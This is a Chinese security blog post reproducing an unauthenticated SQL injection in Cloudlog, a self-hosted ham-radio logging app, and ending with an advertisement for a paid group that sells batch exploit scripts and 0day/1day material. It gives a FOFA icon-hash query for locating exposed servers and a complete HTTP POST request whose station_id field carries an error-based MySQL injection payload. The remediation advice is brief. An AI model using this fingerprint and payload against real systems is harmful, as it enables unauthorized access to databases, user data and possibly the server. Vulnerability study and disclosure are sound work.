#  「漏洞复现」Cloudlog 电台日志系统 request_form SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-21 02:54  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
Cloudlog 是一个自托管的 PHP 应用程序，可让您在任何地方记录您的业余无线电联系人。使用PHP和MySQL构建的基于Web的业余无线电记录应用程序支持从HF到微波的一般站记录任务。  
  
0x03  
  
漏洞威胁  
  
Cloudlog request_form 接口存在未授权SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
icon_hash="-460032467"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pLpHHKbw4aXF5ibK1ZSwctL3MGF0d8C7lsrYbIEDqTB5qfOsOLT0ibm0BVgWrGuxekXECbEs69z84Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /index.php/oqrs/request_form HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pLpHHKbw4aXF5ibK1ZSwctLhHiaZoOJJPcPIWvOIaMeESrvtgvpMyCIoXNRqCpDWjDvf3EnicXc02mg/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pLpHHKbw4aXF5ibK1ZSwctLWkQCib2cH00kLUkFM7PmBibKTgfFF5DIy7d4yuBmX4rT6QVUb1JPVFVw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pLpHHKbw4aXF5ibK1ZSwctLZUqkNMtQGkFvNB6V51CwibsscesIzRU0OXTDRMV5YPSl8icwNX3Odwjw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pLpHHKbw4aXF5ibK1ZSwctLhdSyziazVS7ppZZwf4Is3ldFqFdwIrH8HTw6Fj3cXlhGKFwiburShW1A/640?wx_fmt=gif&from=appmsg "")  
  
  
